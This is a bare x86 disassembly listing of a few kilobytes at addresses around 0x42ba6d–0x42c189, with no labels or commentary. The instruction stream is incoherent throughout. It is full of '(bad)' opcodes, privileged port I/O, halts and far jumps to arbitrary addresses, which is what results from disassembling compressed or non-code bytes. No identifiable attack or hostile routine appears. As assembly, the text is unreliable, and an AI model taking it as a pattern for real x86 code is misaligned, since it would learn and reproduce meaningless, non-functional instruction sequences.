  42ba6d:	ja     0x42ba49
  42ba6f:	ret    
  42ba70:	add    al,0x6c
  42ba72:	dec    ebx
  42ba73:	in     eax,dx
  42ba74:	mov    al,0x75
  42ba76:	enter  0xe2a4,0x80
  42ba7a:	imul   ecx,DWORD PTR ds:0x2eadd2d1,0x8f1a1662
  42ba84:	push   ebx
  42ba85:	cmp    eax,0x6b755025
  42ba8a:	push   ebp
  42ba8b:	xchg   ah,dl
  42ba8d:	lds    eax,FWORD PTR [ebp+ebp*4+0x6ada886d]
  42ba94:	push   ebp
  42ba95:	mov    eax,ds:0x14e6da36
  42ba9a:	loopne 0x42ba51
  42ba9c:	dec    ebp
  42ba9d:	lds    ecx,FWORD PTR [ebp-0x4d38906a]
  42baa3:	add    al,0x52
  42baa5:	sub    BYTE PTR [edx],al
  42baa7:	dec    ebp
  42baa8:	adc    al,0x1b
  42baaa:	pop    ebp
  42baab:	lds    esi,FWORD PTR [edx]
  42baad:	(bad)  
  42baae:	lds    edi,FWORD PTR [eax]
  42bab0:	add    al,0xda
  42bab2:	push   es
  42bab3:	fsubr  DWORD PTR [esi+0x23]
  42bab6:	push   0x4b
  42bab8:	cwde   
  42bab9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42baba:	jmp    0x42ba4b
  42babc:	and    DWORD PTR [ecx-0x7b],esi
  42babf:	ret    0xdc01
  42bac2:	je     0x42baa9
  42bac4:	lock das 
  42bac6:	or     al,0xb6
  42bac8:	xchg   DWORD PTR [esi],esi
  42baca:	mov    ds:0x295cf9c2,al
  42bacf:	imul   DWORD PTR [ebp-0x783af309]
  42bad5:	mov    BYTE PTR [ebx-0x18],ah
  42bad8:	dec    ebx
  42bad9:	test   BYTE PTR [esi+0x61],dh
  42badc:	pop    ebx
  42badd:	mov    BYTE PTR ds:0x37d16e24,ah
  42bae3:	out    dx,eax
  42bae4:	outs   dx,BYTE PTR ds:[esi]
  42bae5:	sub    BYTE PTR [esi-0x4c],0xa2
  42bae9:	mov    dh,0x17
  42baeb:	mov    al,ds:0x2d668d99
  42baf0:	nop    ebp
  42baf3:	(bad)  
  42baf4:	clc    
  42baf5:	jge    0x42baed
  42baf7:	mov    ds:0xd42f85a2,eax
  42bafc:	push   esp
  42bafd:	mov    ebx,0x5fd9476d
  42bb02:	fsubr  DWORD PTR [ecx+0xef80956]
  42bb08:	xor    BYTE PTR [esi+0x1],0x9b
  42bb0c:	arpl   WORD PTR [edx-0x56],sp
  42bb0f:	or     esp,DWORD PTR [esi-0x7c0149f3]
  42bb15:	or     esp,DWORD PTR [ebx]
  42bb17:	cwde   
  42bb18:	or     BYTE PTR [eax-0x5517527f],ah
  42bb1e:	dec    ebx
  42bb1f:	mov    al,0x57
  42bb21:	je     0x42bade
  42bb23:	mov    cl,0x72
  42bb25:	popa   
  42bb26:	mov    al,ds:0x6cca0b6e
  42bb2b:	push   ebx
  42bb2c:	mov    edi,0x221a42c4
  42bb31:	mov    edx,0xaf68c745
  42bb36:	call   DWORD PTR [eax-0x55a91f5a]
  42bb3c:	fs and dl,BYTE PTR es:[esp+ebx*4-0x48fa2e48]
  42bb45:	add    DWORD PTR [edx+0x3fcac657],edx
  42bb4b:	cmp    DWORD PTR [ebp-0x4497fe59],0xd6aaf6b5
  42bb55:	in     eax,0xa7
  42bb57:	xor    ebx,DWORD PTR ds:0xb101d802
  42bb5d:	lahf   
  42bb5e:	mov    bh,0x5f
  42bb60:	call   0x37201b1e
  42bb65:	cmp    ch,BYTE PTR [edx+0x20]
  42bb68:	dec    esi
  42bb69:	ja     0x42bbbe
  42bb6b:	outs   dx,DWORD PTR ds:[esi]
  42bb6c:	test   eax,0xb954280
  42bb71:	or     ebp,DWORD PTR [edx+eax*8-0x3a]
  42bb75:	or     al,0x2a
  42bb77:	cs xchg ecx,eax
  42bb79:	push   edi
  42bb7a:	stc    
  42bb7b:	push   esi
  42bb7c:	mov    eax,0x8139b6b1
  42bb81:	mov    dl,0x83
  42bb83:	pop    esi
  42bb84:	adc    al,0x56
  42bb86:	js     0x42bb88
  42bb88:	xchg   ebx,eax
  42bb89:	ins    DWORD PTR es:[edi],dx
  42bb8a:	inc    ecx
  42bb8b:	or     DWORD PTR [eax+0x4f],ebp
  42bb8e:	sbb    BYTE PTR ds:0x76db54b5,ah
  42bb94:	inc    eax
  42bb95:	push   ds
  42bb96:	mov    al,ds:0x1d046e96
  42bb9b:	ins    DWORD PTR es:[edi],dx
  42bb9c:	pop    ebx
  42bb9d:	ficomp DWORD PTR [edx]
  42bb9f:	sbb    bh,BYTE PTR [edx+ebp*8+0x1fe65b29]
  42bba6:	adc    edx,ebx
  42bba8:	ret    0x85a5
  42bbab:	inc    ecx
  42bbac:	dec    edi
  42bbad:	mov    WORD PTR [eax-0xc],ss
  42bbb0:	jecxz  0x42bc22
  42bbb2:	add    BYTE PTR [ebp+0x3617101d],0x78
  42bbb9:	jl     0x42bc37
  42bbbb:	sub    eax,DWORD PTR [eax+ecx*1]
  42bbbe:	pop    es
  42bbbf:	mov    eax,ds:0x3c1b6e00
  42bbc4:	stos   DWORD PTR es:[edi],eax
  42bbc5:	rol    eax,1
  42bbc7:	jge    0x42bbd9
  42bbc9:	mov    dh,BYTE PTR [esi+0x63]
  42bbcc:	mov    eax,ds:0x2159fd29
  42bbd1:	cmp    eax,0xea1b6edc
  42bbd6:	mov    dh,0x15
  42bbd8:	cmp    DWORD PTR [ebp+0x69],ecx
  42bbdb:	sahf   
  42bbdc:	clc    
  42bbdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bbde:	mov    eax,0x6e084c41
  42bbe3:	retf   
  42bbe4:	sbb    eax,DWORD PTR [ebx]
  42bbe6:	and    BYTE PTR [eax],al
  42bbe8:	push   ecx
  42bbe9:	loopne 0x42bc47
  42bbeb:	scas   eax,DWORD PTR es:[edi]
  42bbec:	jmp    0x3b1b999c
  42bbf1:	xchg   edi,eax
  42bbf2:	addr16 je 0x42bbc5
  42bbf5:	lock jecxz 0x42bc2f
  42bbf8:	fwait
  42bbf9:	dec    edi
  42bbfa:	add    BYTE PTR [esi],dh
  42bbfc:	bound  esp,QWORD PTR [ebx+0x47]
  42bbff:	add    edx,DWORD PTR [edx+0x75b4a3f5]
  42bc05:	imul   ebp,DWORD PTR [ebp+0xf],0xffffffa0
  42bc09:	int3   
  42bc0a:	add    DWORD PTR [edi+0x3f],ebx
  42bc0d:	rcl    ebx,0xb5
  42bc10:	loop   0x42bbc8
  42bc12:	inc    eax
  42bc13:	push   edi
  42bc14:	mov    ecx,DWORD PTR [ebp+0x75]
  42bc17:	daa    
  42bc18:	es nop
  42bc1a:	popa   
  42bc1b:	inc    esp
  42bc1c:	pop    ebp
  42bc1d:	push   0x13343c80
  42bc22:	fs ss jne 0x42bbc9
  42bc26:	sub    DWORD PTR [esi-0x3b],esi
  42bc29:	std    
  42bc2a:	je     0x42bc08
  42bc2c:	fldenv [esi+0x1e]
  42bc2f:	adc    al,0x6b
  42bc31:	test   al,0x6a
  42bc33:	pop    es
  42bc34:	out    0xf7,al
  42bc36:	gs pop ss
  42bc38:	lods   al,BYTE PTR ds:[esi]
  42bc39:	jno    0x42bc56
  42bc3b:	fild   QWORD PTR [ebp+0x6b]
  42bc3e:	cmc    
  42bc3f:	push   ebp
  42bc40:	(bad)  
  42bc41:	ds iret 
  42bc43:	mov    cx,?
  42bc46:	cmp    DWORD PTR [eax-0x7b],ebp
  42bc49:	xchg   DWORD PTR [ebx],ebx
  42bc4b:	pop    ebx
  42bc4c:	fbstp  TBYTE PTR [ebp-0x714ee97f]
  42bc52:	mov    ds:0x445d6d7f,eax
  42bc57:	fisttp DWORD PTR [ecx-0x54b26a18]
  42bc5d:	loopne 0x42bcc4
  42bc5f:	jp     0x42bc1b
  42bc61:	mov    bh,BYTE PTR [edx+0x3e3c616d]
  42bc67:	mov    bh,0xf4
  42bc69:	fsub   DWORD PTR [eax+0x41]
  42bc6c:	jne    0x42bcae
  42bc6e:	fsubr  st(0),st
  42bc70:	stos   BYTE PTR es:[edi],al
  42bc71:	push   edi
  42bc72:	aam    0x17
  42bc74:	shl    BYTE PTR [esi+0x51],1
  42bc77:	sub    eax,0xe180e256
  42bc7c:	popf   
  42bc7d:	lds    eax,FWORD PTR [eax+0x520a0816]
  42bc83:	cmp    edx,DWORD PTR [esi-0x64e4e523]
  42bc89:	arpl   WORD PTR [ebx-0x18ab4eee],ax
  42bc8f:	or     ebx,DWORD PTR [ebp-0x4892fa09]
  42bc95:	lods   eax,DWORD PTR ds:[esi]
  42bc96:	mov    esp,0x4c62407a
  42bc9b:	or     eax,0x5afd5f41
  42bca0:	fdiv   DWORD PTR [esi-0x57]
  42bca3:	pop    edi
  42bca4:	pop    ds
  42bca5:	or     BYTE PTR [esp+esi*8],ah
  42bca8:	jp     0x42bced
  42bcaa:	ret    0x5045
  42bcad:	ins    DWORD PTR es:[edi],dx
  42bcae:	jmp    0x42bc50
  42bcb0:	adc    DWORD PTR [eax-0x6c],0xffffff9e
  42bcb4:	cmp    ebp,esi
  42bcb6:	ins    BYTE PTR es:[edi],dx
  42bcb7:	test   DWORD PTR [edi+0x6d],ebx
  42bcba:	jno    0x42bcea
  42bcbc:	inc    esp
  42bcbd:	ss jae 0x42bcdf
  42bcc0:	fnsave [esi-0x45]
  42bcc3:	mov    ch,0x2
  42bcc5:	jb     0x42bd12
  42bcc7:	in     eax,0xe
  42bcc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bcca:	mov    es,WORD PTR [ecx-0x28]
  42bccd:	pop    edx
  42bcce:	aaa    
  42bccf:	inc    ebx
  42bcd0:	rol    BYTE PTR [ecx+0x35],1
  42bcd3:	test   DWORD PTR [edx+ebx*8+0x5d68578],ebp
  42bcda:	(bad)  ds:0x3ab3837e
  42bce0:	mov    bl,0x3b
  42bce2:	mov    ah,0x4d
  42bce4:	push   eax
  42bce5:	ins    BYTE PTR es:[edi],dx
  42bce6:	sti    
  42bce7:	test   eax,0x62f8dfa0
  42bcec:	ins    DWORD PTR es:[edi],dx
  42bced:	mov    cl,0x51
  42bcef:	fmul   QWORD PTR cs:[edi]
  42bcf2:	mov    dh,0x6
  42bcf4:	pop    esp
  42bcf5:	lock repz fwait
  42bcf8:	and    al,bl
  42bcfa:	cs inc edi
  42bcfc:	xor    BYTE PTR [ecx],cl
  42bcfe:	mov    ecx,0x5e9aabcb
  42bd03:	push   esp
  42bd04:	or     eax,0xd7566b70
  42bd09:	jecxz  0x42bc8f
  42bd0b:	pop    ds
  42bd0c:	rcr    BYTE PTR [ebp+0x50],0xdc
  42bd10:	push   0xd204ba04
  42bd15:	fdiv   DWORD PTR [ebx]
  42bd17:	push   0xeeb6a01b
  42bd1c:	push   ebx
  42bd1d:	sub    BYTE PTR [edx+0x2c],dl
  42bd20:	scas   eax,DWORD PTR es:[edi]
  42bd21:	and    ebx,DWORD PTR [ebx]
  42bd23:	test   al,0xd8
  42bd25:	mov    al,ds:0xd67fb6e4
  42bd2a:	inc    esp
  42bd2b:	inc    esi
  42bd2c:	inc    edi
  42bd2d:	sbb    eax,0x76243d40
  42bd32:	into   
  42bd33:	mov    ah,0xbb
  42bd35:	mov    ah,0x15
  42bd37:	mov    BYTE PTR [esi-0x44],al
  42bd3a:	(bad)  
  42bd3b:	cmp    ebp,DWORD PTR [edi+0x36]
  42bd3e:	cmp    BYTE PTR [esi],dl
  42bd40:	mov    dh,0x9a
  42bd42:	pusha  
  42bd43:	mov    ebx,0x5349517a
  42bd48:	xchg   edi,eax
  42bd49:	sbb    dh,dl
  42bd4b:	and    eax,0x67ae2836
  42bd50:	imul   DWORD PTR [ebx]
  42bd52:	add    BYTE PTR [esi+0x1d8515a],cl
  42bd58:	shl    DWORD PTR [ebx],1
  42bd5a:	fadd   DWORD PTR [edi-0x37]
  42bd5d:	(bad)  
  42bd5f:	sub    BYTE PTR [esi],dh
  42bd61:	or     dl,BYTE PTR [ecx+0x7b]
  42bd64:	mov    esp,0xba0aecdd
  42bd69:	mov    al,0x26
  42bd6b:	pop    ds
  42bd6c:	test   eax,0x3d0dfce7
  42bd71:	and    eax,0x111db6da
  42bd76:	and    DWORD PTR [ebp+0x69],edi
  42bd79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bd7a:	arpl   WORD PTR [ebp+0x20],di
  42bd7d:	mov    bl,BYTE PTR [edi]
  42bd7f:	ins    DWORD PTR es:[edi],dx
  42bd80:	or     al,0xcf
  42bd83:	outs   dx,DWORD PTR ds:[esi]
  42bd84:	cli    
  42bd85:	ret    
  42bd86:	dec    eax
  42bd87:	rcl    BYTE PTR [ecx+esi*4+0x29],1
  42bd8b:	mov    bh,0x6f
  42bd8d:	push   esp
  42bd8e:	mov    ds:0xb0055db2,eax
  42bd93:	push   ebp
  42bd94:	add    al,0xa3
  42bd96:	cli    
  42bd97:	mov    esp,0x454b0553
  42bd9c:	xchg   ebx,eax
  42bd9d:	xor    al,0x1e
  42bd9f:	mov    ch,0x1
  42bda1:	mov    ds:0x53d7c6d,al
  42bda6:	jb     0x42bd69
  42bda8:	and    edi,DWORD PTR [edi+0x50d6ed4b]
  42bdae:	xchg   esp,eax
  42bdaf:	out    0x53,al
  42bdb1:	popf   
  42bdb2:	cs jp  0x42bdf9
  42bdb5:	adc    cl,0xad
  42bdb8:	test   eax,0x9703beaa
  42bdbd:	lods   eax,DWORD PTR ds:[esi]
  42bdbe:	adc    edi,esi
  42bdc0:	mov    ch,0x21
  42bdc2:	bound  eax,QWORD PTR [edi+0x1c]
  42bdc5:	sub    edx,eax
  42bdc7:	or     BYTE PTR [eax],ah
  42bdc9:	mov    al,0x36
  42bdcb:	inc    ecx
  42bdcc:	mov    cl,0xb1
  42bdce:	pop    ds
  42bdcf:	sbb    ebx,DWORD PTR [ebx]
  42bdd1:	dec    edx
  42bdd2:	pop    esi
  42bdd3:	adc    eax,0x8eadc152
  42bdd8:	mov    cl,BYTE PTR [esi+0x5d]
  42bddb:	scas   eax,DWORD PTR es:[edi]
  42bddc:	nop
  42bddd:	jo     0x42bdba
  42bddf:	inc    edx
  42bde0:	(bad)  [edx]
  42bde2:	cwde   
  42bde3:	sub    al,0x3f
  42bde5:	call   0x6e15:0x2d5ba79c
  42bdec:	pop    ebx
  42bded:	push   ss
  42bdee:	in     al,0x65
  42bdf0:	fcomp  DWORD PTR [ecx+0x22]
  42bdf3:	gs sub al,al
  42bdf6:	inc    edx
  42bdf7:	inc    ebp
  42bdf8:	mov    ebx,0xe3b8a3b9
  42bdfd:	mov    ah,0x4b
  42bdff:	jbe    0x42be05
  42be01:	hlt    
  42be02:	inc    esp
  42be03:	jno    0x42be3c
  42be05:	mov    ah,0x84
  42be07:	pop    esi
  42be08:	adc    eax,0x822a9adc
  42be0d:	imul   ecx,DWORD PTR [esi+ebp*1+0x7b5b64],0x76
  42be15:	cmp    ch,al
  42be17:	cmp    al,0xf9
  42be19:	(bad)  
  42be1a:	push   esi
  42be1b:	sub    DWORD PTR [ebx-0x77712aac],eax
  42be21:	jp     0x42be2d
  42be23:	dec    edi
  42be24:	(bad)  
  42be25:	call   0x67187970
  42be2a:	iret   
  42be2b:	scas   eax,DWORD PTR es:[edi]
  42be2c:	jno    0x42be2d
  42be2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42be2f:	inc    ebp
  42be30:	jmp    0x42be91
  42be32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42be33:	ins    DWORD PTR es:[edi],dx
  42be34:	stos   DWORD PTR es:[edi],eax
  42be35:	test   eax,0x70a0b38d
  42be3a:	adc    esp,eax
  42be3c:	xor    BYTE PTR [ebp+ebx*2-0x698924bb],0xbc
  42be44:	aas    
  42be45:	sbb    al,al
  42be47:	xchg   ebp,eax
  42be48:	pop    ss
  42be49:	mov    ds:0xb52c6ed8,al
  42be4e:	add    ecx,ecx
  42be50:	test   BYTE PTR [esi],0xfb
  42be53:	in     eax,dx
  42be54:	aam    0xa5
  42be56:	ins    DWORD PTR es:[edi],dx
  42be57:	imul   ebp,esp,0xffffff8e
  42be5a:	xchg   edx,eax
  42be5b:	data16 ja 0x42be9f
  42be5e:	sub    DWORD PTR [edi],ebx
  42be60:	jbe    0x42be3d
  42be62:	push   cs
  42be63:	add    dh,BYTE PTR [esi+0x18]
  42be66:	icebp  
  42be67:	mov    bh,0x84
  42be69:	inc    edi
  42be6a:	(bad)  
  42be6b:	fwait
  42be6c:	mov    edx,0xe5a5a0a9
  42be71:	add    BYTE PTR [esi],ah
  42be73:	cmp    BYTE PTR [edi-0x49ba79b0],al
  42be79:	je     0x42bedc
  42be7b:	mov    eax,ds:0xac32c4b0
  42be80:	pop    es
  42be81:	inc    esi
  42be82:	xlat   BYTE PTR ds:[ebx]
  42be83:	jmp    0xd843997d
  42be88:	mov    dh,0x4a
  42be8a:	inc    esi
  42be8b:	cmp    esp,ebp
  42be8d:	in     al,0xc3
  42be8f:	pusha  
  42be90:	imul   ebp,DWORD PTR [eax+eax*4-0x54],0xffffffbf
  42be95:	(bad)  [ecx]
  42be97:	xchg   edx,eax
  42be98:	dec    eax
  42be99:	pop    esp
  42be9a:	xchg   ebp,eax
  42be9b:	mov    dh,0xa5
  42be9d:	aas    
  42be9e:	xchg   ecx,eax
  42be9f:	jno    0x42be41
  42bea1:	xchg   BYTE PTR [edi+0x376c1075],bh
  42bea7:	pushf  
  42bea8:	call   0xb551:0xca85920d
  42beaf:	ins    DWORD PTR es:[edi],dx
  42beb0:	jecxz  0x42be68
  42beb2:	adc    al,0x6f
  42beb4:	dec    ah
  42beb6:	loopne 0x42bedf
  42beb8:	enter  0x941d,0x4a
  42bebc:	mov    cl,0xdd
  42bebe:	fiadd  DWORD PTR [esi]
  42bec0:	sar    DWORD PTR [ecx-0x441682ce],0xe6
  42bec7:	mov    ch,0xa2
  42bec9:	mov    eax,0x8d8441d5
  42bece:	or     eax,0x447698d4
  42bed3:	fcomp  QWORD PTR [edx]
  42bed5:	adc    eax,edx
  42bed7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bed8:	(bad)  
  42bed9:	xor    cl,BYTE PTR ds:0xb4bbae85
  42bedf:	adc    eax,0xf4d4fb96
  42bee4:	loopne 0x42bf22
  42bee6:	dec    ebp
  42bee7:	sbb    ecx,DWORD PTR [esp+edx*1]
  42beea:	mov    BYTE PTR [edx-0x1f],0x46
  42beee:	fsubrp st(2),st
  42bef0:	das    
  42bef1:	sbb    DWORD PTR [edx+0x6e08b4b1],eax
  42bef7:	or     ebx,ebx
  42bef9:	lock adc edi,edx
  42befc:	std    
  42befd:	fisttp QWORD PTR [edx+ebx*8+0x54746c59]
  42bf04:	mov    ebx,0x914a96d4
  42bf09:	pop    ds
  42bf0a:	cmp    DWORD PTR [ebp+edx*8+0x5a],ecx
  42bf0e:	outs   dx,BYTE PTR ds:[esi]
  42bf0f:	ins    DWORD PTR es:[edi],dx
  42bf10:	pop    edx
  42bf11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bf12:	pop    es
  42bf13:	cld    
  42bf14:	mov    bl,0x82
  42bf16:	fsub   st(2),st
  42bf18:	inc    esi
  42bf19:	mov    ebx,0x9dae04b0
  42bf1e:	and    al,0x31
  42bf20:	xchg   ebp,eax
  42bf21:	or     DWORD PTR [ecx],ebp
  42bf23:	jne    0x42bf99
  42bf25:	arpl   WORD PTR [ebx-0x60],bp
  42bf28:	loope  0x42beaa
  42bf2a:	fwait
  42bf2b:	cmc    
  42bf2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bf2d:	mov    esi,0xd045a293
  42bf32:	adc    BYTE PTR [ebx-0x47f4bb0f],ah
  42bf38:	mov    cl,0x15
  42bf3a:	push   ecx
  42bf3b:	push   ebx
  42bf3c:	repnz int3 
  42bf3e:	cmp    edi,eax
  42bf40:	arpl   WORD PTR [edx-0x39497a21],sp
  42bf46:	jmp    DWORD PTR [edi-0x4f53af54]
  42bf4c:	cmp    dl,BYTE PTR [edx-0x7e4be8be]
  42bf52:	pop    edi
  42bf53:	cli    
  42bf54:	loop   0x42bf58
  42bf56:	fcmovnu st,st(4)
  42bf58:	repnz in eax,dx
  42bf5a:	(bad)  
  42bf5b:	(bad)  
  42bf5c:	es int3 
  42bf5e:	inc    ecx
  42bf5f:	or     eax,0x4ba7941c
  42bf64:	add    BYTE PTR [esi-0x22569e17],al
  42bf6a:	ficom  DWORD PTR [eax+0x47245f32]
  42bf70:	xor    eax,0x37162559
  42bf75:	ss mov dh,0x76
  42bf78:	sub    esi,DWORD PTR [esi-0x26]
  42bf7b:	mov    bl,0xec
  42bf7d:	inc    ebp
  42bf7e:	daa    
  42bf7f:	adc    eax,0xd6e058e3
  42bf84:	mov    al,ds:0xe93d7d6a
  42bf89:	dec    edi
  42bf8a:	lahf   
  42bf8b:	inc    edi
  42bf8c:	inc    eax
  42bf8d:	mov    bh,0xae
  42bf8f:	stos   BYTE PTR es:[edi],al
  42bf90:	(bad)  
  42bf91:	je     0x42bf1e
  42bf93:	jp     0x42bf3d
  42bf95:	shr    BYTE PTR [ebp+0x4c5a6883],cl
  42bf9b:	pop    edi
  42bf9c:	test   BYTE PTR [eax-0x57],dl
  42bf9f:	jl     0x42bfe2
  42bfa1:	push   ecx
  42bfa2:	mov    dh,BYTE PTR [esi]
  42bfa4:	mov    dh,0xe
  42bfa6:	xchg   edi,eax
  42bfa7:	daa    
  42bfa8:	inc    ebp
  42bfa9:	pop    esp
  42bfaa:	mov    edx,0x1c45a37c
  42bfaf:	or     al,0x87
  42bfb1:	xor    eax,DWORD PTR [eax]
  42bfb3:	inc    esp
  42bfb4:	pop    esp
  42bfb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bfb6:	fist   DWORD PTR [esi-0x42]
  42bfb9:	sbb    ebx,edi
  42bfbb:	retf   
  42bfbc:	lock add BYTE PTR [eax],bh
  42bfbf:	cli    
  42bfc0:	mov    DWORD PTR [edx+0x3e],esp
  42bfc3:	add    DWORD PTR [edx+0x30b6d858],ecx
  42bfc9:	add    bh,ah
  42bfcb:	jno    0x42bff7
  42bfcd:	xor    al,0x6e
  42bfcf:	mov    ch,0xd
  42bfd1:	inc    esp
  42bfd2:	in     eax,dx
  42bfd3:	sahf   
  42bfd4:	mov    dh,0x1d
  42bfd6:	inc    ebx
  42bfd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bfd8:	ins    DWORD PTR es:[edi],dx
  42bfd9:	ret    0x6b7
  42bfdc:	mov    eax,0xedb78cb1
  42bfe1:	popa   
  42bfe2:	mov    DWORD PTR [ebp-0x346425e5],esi
  42bfe8:	fist   DWORD PTR [edx+0x7]
  42bfeb:	adc    bh,cl
  42bfed:	dec    esp
  42bfee:	loopne 0x42bf89
  42bff0:	(bad)
  42bff3:	stos   DWORD PTR es:[edi],eax
  42bff4:	outs   dx,BYTE PTR ss:[esi]
  42bff6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bff7:	xchg   ecx,eax
  42bff8:	xlat   BYTE PTR ds:[ebx]
  42bff9:	pop    edx
  42bffa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bffb:	and    eax,0x6db55c10
  42c000:	aaa    
  42c001:	mov    dh,0xde
  42c003:	mov    WORD PTR [edi+0xc],ss
  42c006:	int    0xd3
  42c008:	into   
  42c009:	(bad)  
  42c00a:	sbb    BYTE PTR [eax],0x8
  42c00d:	fdiv   DWORD PTR [esi+0x55]
  42c010:	repnz pop ss
  42c012:	pop    es
  42c013:	jecxz  0x42bfee
  42c015:	push   eax
  42c016:	mov    ds:0xc8239a36,eax
  42c01b:	daa    
  42c01c:	stos   BYTE PTR es:[edi],al
  42c01d:	jle    0x42bfa4
  42c01f:	test   DWORD PTR [eax],ebx
  42c021:	or     eax,DWORD PTR [eax-0x6d2075c3]
  42c027:	xor    al,0x5b
  42c029:	or     eax,0x9878b755
  42c02e:	shr    DWORD PTR [ecx],1
  42c030:	dec    ecx
  42c031:	addps  xmm1,XMMWORD PTR [esi]
  42c034:	loopne 0x42c07c
  42c036:	mov    ebx,0x71365c6d
  42c03b:	fisub  WORD PTR [esi+0x68]
  42c03e:	(bad)  
  42c03f:	or     eax,0x6c2b6db9
  42c044:	or     ah,BYTE PTR [edi]
  42c046:	add    al,0xef
  42c048:	lods   al,BYTE PTR ds:[esi]
  42c049:	pop    esp
  42c04a:	lahf   
  42c04b:	jmp    0xb752cdbe
  42c050:	ret    
  42c051:	jge    0x42c0ba
  42c053:	jno    0x42c0b5
  42c055:	je     0x42c010
  42c057:	jae    0x42c0cf
  42c059:	inc    ecx
  42c05a:	mov    cl,0x6d
  42c05c:	stos   BYTE PTR es:[edi],al
  42c05d:	inc    edx
  42c05e:	std    
  42c05f:	inc    edx
  42c060:	push   ebx
  42c061:	or     DWORD PTR [ebx-0x78272b50],edi
  42c067:	pop    ebx
  42c068:	jecxz  0x42c0b8
  42c06a:	repnz cli 
  42c06c:	popf   
  42c06d:	dec    ecx
  42c06e:	sbb    al,0x8f
  42c070:	or     ecx,DWORD PTR [ebx]
  42c072:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c073:	ins    DWORD PTR es:[edi],dx
  42c074:	fstp   TBYTE PTR [eax]
  42c076:	(bad)  
  42c077:	push   eax
  42c078:	shl    DWORD PTR [edx],cl
  42c07a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c07b:	push   esp
  42c07c:	push   0x17
  42c07e:	call   0xed49:0xf31de8a
  42c085:	hlt    
  42c086:	push   eax
  42c087:	ins    DWORD PTR es:[edi],dx
  42c088:	cmp    al,0x6c
  42c08a:	fucomp st(3)
  42c08c:	ja     0x42c105
  42c08e:	sbb    BYTE PTR [eax+0x4f],0x76
  42c092:	(bad)  
  42c094:	lods   eax,DWORD PTR ds:[esi]
  42c095:	bound  edi,QWORD PTR es:[ebx+0x4aeb48c2]
  42c09c:	jmp    0xb4fe8030
  42c0a1:	dec    ebp
  42c0a2:	add    al,0x97
  42c0a4:	popa   
  42c0a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c0a6:	mov    WORD PTR [ebx],?
  42c0a8:	loope  0x42c04b
  42c0aa:	lds    esi,FWORD PTR [edx*2+0x49d850b5]
  42c0b1:	jb     0x42c037
  42c0b3:	fsub   st(0),st
  42c0b5:	sub    BYTE PTR [esi],0x67
  42c0b8:	cwde   
  42c0b9:	popf   
  42c0ba:	mov    esp,0x16344e19
  42c0bf:	add    ah,al
  42c0c1:	lods   eax,DWORD PTR ds:[esi]
  42c0c2:	sub    eax,0x8ff80552
  42c0c7:	xor    BYTE PTR [edx-0x27fdc524],dh
  42c0cd:	sbb    esp,ecx
  42c0cf:	aas    
  42c0d0:	xchg   edi,eax
  42c0d1:	sahf   
  42c0d2:	repnz dec esp
  42c0d4:	jmp    0x2e48:0x154db56f
  42c0db:	xchg   BYTE PTR [eax+edx*8],dl
  42c0de:	hlt    
  42c0df:	stos   BYTE PTR es:[edi],al
  42c0e0:	add    BYTE PTR [edi+0xf],ch
  42c0e3:	pop    ebx
  42c0e4:	xchg   edi,eax
  42c0e5:	into   
  42c0e6:	jmp    ebp
  42c0e8:	test   eax,0x478e195c
  42c0ed:	shl    dh,cl
  42c0ef:	add    BYTE PTR [ebp+edx*1+0x197bca02],dh
  42c0f6:	pop    ebp
  42c0f7:	push   0xbe5c41da
  42c0fc:	mov    ah,0x9e
  42c0fe:	retf   0x525c
  42c101:	repnz add BYTE PTR [edi],ch
  42c104:	fiadd  DWORD PTR [edx+0xd8a81b6]
  42c10a:	jle    0x42c166
  42c10c:	mov    esp,0x6e3a2f43
  42c111:	(bad)  
  42c112:	push   esp
  42c113:	ins    BYTE PTR es:[edi],dx
  42c114:	mov    bh,0x68
  42c116:	jle    0x42c0e0
  42c118:	inc    esp
  42c119:	cmc    
  42c11a:	mov    esi,0x6adbade0
  42c11f:	test   al,0xe0
  42c121:	push   0x51
  42c123:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c124:	mov    esi,0xb6aac2d3
  42c129:	ins    DWORD PTR es:[edi],dx
  42c12a:	lea    esp,[eax-0x60]
  42c12d:	loop   0x42c152
  42c12f:	jno    0x42c129
  42c131:	fs in  al,dx
  42c133:	lods   eax,DWORD PTR ds:[esi]
  42c134:	sub    eax,DWORD PTR [edx+0x1bdab9db]
  42c13a:	hlt    
  42c13b:	test   eax,0x36d29d4
  42c140:	lds    ecx,FWORD PTR [ebp-0x11e71bbd]
  42c146:	fxtract 
  42c148:	in     al,dx
  42c149:	and    esi,DWORD PTR ds:0x4055b040
  42c14f:	mov    ah,0x1d
  42c151:	stos   DWORD PTR es:[edi],eax
  42c152:	mov    eax,ds:0x445b1b04
  42c157:	arpl   WORD PTR [ebx+0x451c1d97],dx
  42c15d:	push   ecx
  42c15e:	test   al,0x6d
  42c160:	ins    BYTE PTR es:[edi],dx
  42c161:	or     BYTE PTR [ecx+0x51746d79],dl
  42c167:	ins    DWORD PTR es:[edi],dx
  42c168:	mov    bl,0xd4
  42c16a:	push   eax
  42c16b:	leave  
  42c16c:	js     0x42c178
  42c16e:	fcmovnbe st,st(2)
  42c170:	inc    esi
  42c171:	mov    ebx,0xbbb89fb
  42c176:	cdq    
  42c177:	adc    DWORD PTR [ecx-0x5e],ebx
  42c17a:	jp     0x42c12d
  42c17c:	sub    BYTE PTR [edx+0x8bab6d0],bh
  42c182:	sbb    dh,BYTE PTR [edi+0x2b]
  42c185:	jns    0x42c156
  42c187:	jge    0x42c1f6
  42c189:	fsubr  QWORD PTR [eax-0x2]
